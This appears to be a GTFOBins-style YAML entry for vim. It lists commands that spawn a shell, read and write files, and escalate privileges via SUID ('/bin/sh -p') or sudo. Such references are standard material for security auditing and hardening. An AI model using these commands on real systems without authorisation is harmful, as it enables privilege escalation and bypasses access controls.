---
functions:
  shell:
    - code: vim -c ':!/bin/sh'
    - code: |
        vim
        :set shell=/bin/sh
        :shell
  file-write:
    - code: |
        vim file_to_write
        iDATA
        ^[
        w
  file-read:
    - code: vim file_to_read
  suid:
    - code: ./vim -c ':!/bin/sh -p'
  sudo:
    - code: sudo vim -c ':!/bin/sh'
---
